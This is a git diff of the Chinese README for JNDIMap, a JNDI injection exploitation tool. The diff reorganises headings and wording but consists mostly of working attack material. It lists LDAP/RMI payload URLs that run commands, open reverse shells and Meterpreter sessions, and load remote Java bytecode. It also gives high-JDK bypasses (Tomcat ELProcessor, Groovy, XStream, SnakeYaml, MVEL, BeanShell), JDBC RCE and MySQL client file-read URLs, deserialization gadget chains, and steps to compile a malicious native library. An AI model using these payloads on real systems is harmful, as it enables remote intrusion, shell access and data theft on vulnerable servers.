@@ -30,21 +30,21 @@ Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-s <ldaps
 
 `-h`: 显示 Usage 信息
 
-## JNDI URLs
+## JNDI URL 注意事项
 
 注意传入的 Base64 均为 **Base64 URL 编码**, 即把 `+` 和 `/` 替换为 `-` 和 `_`
 
 大部分参数均支持自动 Base64 URL 解码, 即可以直接传入明文 (命令/IP/端口/URL) 或 Base64 URL 编码后的内容 (部分路由只接受 Base64 URL 编码后的参数, 下文会特别注明)
 
-以下路由除 `/Deserialize/*` (LDAP(s) 反序列化) 以外, 均支持 RMI, LDAP 和 LDAPS 协议
+以下路由除 `/Deserialize/*` (LDAP 反序列化) 以外, 均支持 RMI, LDAP 和 LDAPS 协议
 
 对于 RMI 协议, 只需要将 `ldap://127.0.0.1:1389/` 替换为 `rmi://127.0.0.1:1099/` 即可
 
 对于 LDAPS 协议, 只需要将 `ldap://127.0.0.1:1389/` 替换为 `ldaps://127.0.0.1:1636/` 即可
 
-### Basic
+## Basic
 
-直接通过 JNDI Reference 加载远程 Class
+直接通过 JNDI Reference 类加载远程 Java 字节码
 
 Java 版本需小于 8u121 (RMI 协议) 或 8u191 (LDAP 协议)
 
@@ -57,7 +57,7 @@ ldap://127.0.0.1:1389/Basic/DNSLog/eHh4LmRuc2xvZy5jbg==
 ldap://127.0.0.1:1389/Basic/Command/open -a Calculator
 ldap://127.0.0.1:1389/Basic/Command/b3BlbiAtYSBDYWxjdWxhdG9y
 
-# 加载自定义 Class 字节码
+# 加载自定义 Java 字节码
 
 # URL 传参加载
 ldap://127.0.0.1:1389/Basic/FromUrl/<base64-url-encoded-java-bytecode>
@@ -65,75 +65,126 @@ ldap://127.0.0.1:1389/Basic/FromUrl/<base64-url-encoded-java-bytecode>
 ldap://127.0.0.1:1389/Basic/FromFile/Evil.class # 相对于当前路径
 ldap://127.0.0.1:1389/Basic/FromFile/<base64-url-encoded-path-to-evil-class-file>
 
-# 原生反弹 Shell (支持 Windows)
+# 反弹 Shell (支持 Windows)
 ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444
 ldap://127.0.0.1:1389/Basic/ReverseShell/MTI3LjAuMC4x/NDQ0NA==
 
-# 原生反弹 Meterpreter (java/meterpreter/reverse_tcp)
+# 反弹 Meterpreter (java/meterpreter/reverse_tcp)
 ldap://127.0.0.1:1389/Basic/Meterpreter/127.0.0.1/4444
 ldap://127.0.0.1:1389/Basic/Meterpreter/MTI3LjAuMC4x/NDQ0NA==
 ```
 
-### Bypass
+## BeanFactory Bypass
 
-通过以下方式绕过高版本 JDK 限制, 支持 Basic 所有功能
+基于 BeanFactory 绕过高版本 JDK 限制, Tomcat 版本需小于 8.5.79 或 9.0.63
+
+支持如下绕过方式:
 
 - Tomcat ELProcessor
 - Groovy ClassLoader/Shell
-- SnakeYaml
 - XStream
-- MVEL
+- SnakeYaml
 - BeanShell
+- MVEL
+- MLet
+- NativeLibLoader
 
-上述方式均依赖于 BeanFactory, 因此 Tomcat 版本需小于 8.5.79 或 9.0.63
+*上述方式除 MLet 和 NativeLibLoader 外, 均支持 Basic 模块所有功能*
+
+### Tomcat ELProcessor
+
+利用 `javax.el.ELProcessor` 执行 EL 表达式
 
 ```bash
 # Tomcat Bypass
 ldap://127.0.0.1:1389/TomcatBypass/Command/open -a Calculator
+```
 
-# Groovy Bypass
+### Groovy ClassLoader/Shell
+
+利用 `groovy.lang.GroovyClassLoader` 和 `groovy.lang.GroovyShell` 执行 Groovy 脚本
+
+```bash
+# GroovyClassLoader
 ldap://127.0.0.1:1389/GroovyClassLoader/Command/open -a Calculator
+
+# GroovyShell
 ldap://127.0.0.1:1389/GroovyShell/Command/open -a Calculator
+```
 
-# SnakeYaml Bypass
-ldap://127.0.0.1:1389/SnakeYaml/Command/open -a Calculator
+### XStream
 
+利用 XStream 反序列化实现 RCE
+
+反序列化部分使用 UIDefaults + SwingLazyValue 依次触发下列 Gadget:
+
+- 任意文件写: `com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename`
+- XSLT 加载: `com.sun.org.apache.xalan.internal.xslt.Process._main`
+
+XSLT payload 部分使用了 Spring 的反射库调用 defineClass, 因此需要依赖 Spring 环境
+
+```bash
 # XStream Bypass (依赖 Spring)
 # 基于任意文件写 + XSLT 加载, 因为先后顺序问题有概率失败, 需要多试几次
 ldap://127.0.0.1:1389/XStream/Command/open -a Calculator
+````
 
-# MVEL Bypass
-ldap://127.0.0.1:1389/MVEL/Command/open -a Calculator
+### SnakeYaml
 
+利用 SnakeYaml 反序列化实现 RCE
+
+反序列化部分使用 URLClassLoader 加载 `javax.script.ScriptEngineManager` SPI 实现类, 内部会通过 ScriptEngine 执行 JS 代码
+
+```bash
+# SnakeYaml Bypass
+ldap://127.0.0.1:1389/SnakeYaml/Command/open -a Calculator
+```
+
+### BeanShell
+
+利用 `bsh.Interpreter.eval` 执行 BeanShell 脚本
+
+```bash
 # BeanShell Bypass
 ldap://127.0.0.1:1389/BeanShell/Command/open -a Calculator
 ```
 
+### MVEL
+
+利用 `org.mvel2.sh.ShellSession.exec` 方法执行 MVEL 表达式
+
+```bash
+# MVEL Bypass
+ldap://127.0.0.1:1389/MVEL/Command/open -a Calculator
+```
+
 ### MLet
 
-通过 MLet 探测 classpath 中存在的类
+利用 `javax.management.loading.MLet` 的 loadClass 和 addURL 方法探测 classpath 中存在的类
 
 如果 `com.example.TestClass` 这个类存在, 则 HTTP 服务器会接收到一个 `/com/example/TestClass_exists.class` 请求
 
 ```bash
+# MLet
 ldap://127.0.0.1:1389/MLet/com.example.TestClass
 ```
 
 ### NativeLibLoader
 
-通过 NativeLibLoader 加载目标服务器上的动态链接库
+利用 `com.sun.glass.utils.NativeLibLoader.loadLibrary` 方法加载目标服务器上的本地库
 
-需要先提前以其它方式在目标机器上写入一个 dll/so/dylib
+需要先提前以其它方式在目标机器上写入 dll/so/dylib
 
 注意传入的 path 为绝对路径, 且不能包含后缀名
 
 例如: 服务器上存在 `/tmp/evil.so`, 则 path 为 `/tmp/evil`
 
 ```bash
+# NativeLibLoader
 ldap://127.0.0.1:1389/NativeLibLoader/<base64-url-encoded-path-to-native-library>
 ```
 
-动态链接库源码
+本地库源码
 
 ```c
 #include <stdlib.h>
@@ -155,7 +206,7 @@ gcc -shared -fPIC exp.c -o exp.dylib
 gcc -shared -fPIC exp.c -o exp.so
 ```
 
-### JDBC RCE
+## JDBC RCE
 
 支持以下数据库连接池的 JDBC RCE
 
@@ -165,11 +216,19 @@ gcc -shared -fPIC exp.c -o exp.so
 - Alibaba Druid
 - HikariCP
 
-将 URL 中的 Factory 替换为 CommonsDBCP1/CommonsDBCP2/TomcatDBCP1/TomcatDBCP2/TomcatJDBC/Druid/HikariCP 其中之一
+需要将 URL 中的 `Factory` 替换为如下内容之一
 
-#### MySQL
+- CommonsDBCP1
+- CommonsDBCP2
+- TomcatDBCP1
+- TomcatDBCP2
+- TomcatJDBC
+- Druid
+- HikariCP
 
-**MySQL JDBC 反序列化**
+### MySQL
+
+#### MySQL JDBC 反序列化 RCE
 
 ```bash
 # detectCustomCollations (5.1.19-5.1.48, 6.0.2-6.0.6)
@@ -205,7 +264,7 @@ jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.
 jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=test
 ```
 
-**MySQL 客户端任意文件读取**
+#### MySQL 客户端任意文件读取
 
 ```bash
 # 全版本
@@ -227,7 +286,7 @@ jdbc:mysql://127.0.0.1:3306/test?allowLoadLocalInfile=true&allowUrlInLocalInfile
 
 [https://github.com/fnmsd/MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server)
 
-#### PostgreSQL
+### PostgreSQL
 
 通过 PostgreSQL JDBC URL 的 socketFactory 和 socketFactoryArg 参数实例化 ClassPathXmlApplicationContext 实现 RCE
 
@@ -235,13 +294,13 @@ jdbc:mysql://127.0.0.1:3306/test?allowLoadLocalInfile=true&allowUrlInLocalInfile
 # 命令执行
 ldap://127.0.0.1:1389/Factory/PostgreSQL/Command/open -a Calculator
 
-# 原生反弹 Shell
+# 反弹 Shell
 ldap://127.0.0.1:1389/Factory/PostgreSQL/ReverseShell/127.0.0.1/4444
 ````
 
-#### H2
+### H2
 
-通过 H2 JDBC URL 的 INIT 参数执行 SQL 语句, 支持命令执行和原生反弹 Shell
+通过 H2 JDBC URL 的 INIT 参数执行 SQL 语句, 支持命令执行和反弹 Shell
 
 三种方式 RCE: CREATE ALIAS + Java/Groovy, CREATE TRIGGER + JavaScript
 
@@ -251,7 +310,7 @@ ldap://127.0.0.1:1389/Factory/H2/Java/Command/open -a Calculator
 ldap://127.0.0.1:1389/Factory/H2/Groovy/Command/open -a Calculator
 ldap://127.0.0.1:1389/Factory/H2/JavaScript/Command/open -a Calculator
 
-# 原生反弹 Shell
+# 反弹 Shell
 ldap://127.0.0.1:1389/Factory/H2/Java/ReverseShell/127.0.0.1/4444
 ldap://127.0.0.1:1389/Factory/H2/Groovy/ReverseShell/127.0.0.1/4444
 ldap://127.0.0.1:1389/Factory/H2/JavaScript/ReverseShell/127.0.0.1/4444
@@ -271,17 +330,17 @@ ldap://127.0.0.1:1389/Factory/H2/JRE/Spring/Command/open -a Calculator
 ldap://127.0.0.1:1389/Factory/H2/JRE/Spring/ReverseShell/127.0.0.1/4444
 ```
 
-#### Derby
+### Derby
 
-**Derby SQL RCE**
+#### Derby SQL RCE
 
-支持执行命令和原生反弹 Shell
+支持命令执行和反弹 Shell
 
 ```bash
 # 1. 加载远程 jar 并创建相关存储过程 (会自动创建数据库)
 ldap://127.0.0.1:1389/Factory/Derby/Install/<database>
 
-# 2. 执行命令/原生反弹 Shell
+# 2. 命令执行/反弹 Shell
 ldap://127.0.0.1:1389/Factory/Derby/Command/<database>/open -a Calculator
 ldap://127.0.0.1:1389/Factory/Derby/ReverseShell/<database>/ReverseShell/127.0.0.1/4444
 
@@ -311,7 +370,7 @@ ldap://127.0.0.1:1389/HikariCP/Derby/CreateRevProc/<database>
 
 因此最好不要多次执行 Install/InstallJar 路由, 并且记得 Drop 数据库以释放内存
 
-**Derby 主从复制反序列化 RCE**
+#### Derby 主从复制反序列化 RCE
 
 JNDI 本身就支持反序列化, 意义不大, 可能在某些比较极限的场景下有用 (例如过滤了 LDAP 协议, 仅支持 RMI)
 
@@ -340,15 +399,17 @@ Usage: java -cp JNDIMap.jar map.jndi.server.DerbyServer [-p <port>] [-g <gadget>
 
 `-h`: 显示 Usage 信息
 
-### Deserialize
+### LDAP Deserialization
 
-通过 LDAP(s) 协议触发 Java 原生反序列化, 不支持 RMI 协议
+通过 LDAP、LDAPS 协议触发 Java 反序列化, 不支持 RMI 协议
 
-JNDIMap 内置以下利用链, 同时也支持自定义数据反序列化
+JNDIMap 内置以下利用链, 同时也支持反序列化自定义数据
 
 - CommonsCollections K1-K4
-- CommonsBeanutils (1.8.3 + 1.9.4)
-- Fastjson (1.2.x + 2.0.x)
+- CommonsBeanutils183
+- CommonsBeanutils194
+- Fastjson1 (1.2.x)
+- Fastjson2 (2.0.x)
 - Jackson
 
 ```bash
@@ -385,12 +446,12 @@ ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/ReverseShell/127.0.0.1/444
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/ReverseShell/127.0.0.1/4444
 
-# Jackson 原生反序列化
+# Jackson 反序列化
 # 使用 JdkDynamicAopProxy 优化不稳定性问题, 需要 spring-aop 依赖
 ldap://127.0.0.1:1389/Deserialize/Jackson/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/Jackson/ReverseShell/127.0.0.1/4444
 
-# Fastjson 原生反序列化
+# Fastjson 反序列化
 
 # Fastjson1: 全版本 (1.2.x)
 ldap://127.0.0.1:1389/Deserialize/Fastjson1/Command/open -a Calculator
@@ -401,7 +462,7 @@ ldap://127.0.0.1:1389/Deserialize/Fastjson2/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/Fastjson2/ReverseShell/127.0.0.1/4444
 ```
 
-### Script
+## Script
 
 JNDIMap 支持使用 Nashorn JavaScript 引擎 (基于 ES5) 编写自定义 JNDI Payload 脚本
 
@@ -449,9 +510,9 @@ java -jar JNDIMap.jar -f /path/to/evil.js -u "/Script/open -a Calculator"
 ldap://127.0.0.1:1389/x
 ```
 
-### useReferenceOnly
+## useReferenceOnly
 
-对于 LDAP(s) 协议的 JNDI 注入, 如果想要利用 ObjectFactory 绕过, 目前已有的方法都是将 LDAP 协议返回的 javaSerializedData 属性设置为 Reference 对象的序列化数据
+对于 LDAP 协议的 JNDI 注入, 如果想要利用 ObjectFactory 绕过, 目前已有的方法都是将 LDAP 协议返回的 javaSerializedData 属性设置为 Reference 对象的序列化数据
 
 但是自 JDK 21 开始 `com.sun.jndi.ldap.object.trustSerialData` 参数默认为 false, 即无法通过 LDAP 协议触发反序列化, 也就无法通过上面的方法解析 Reference 对象
 
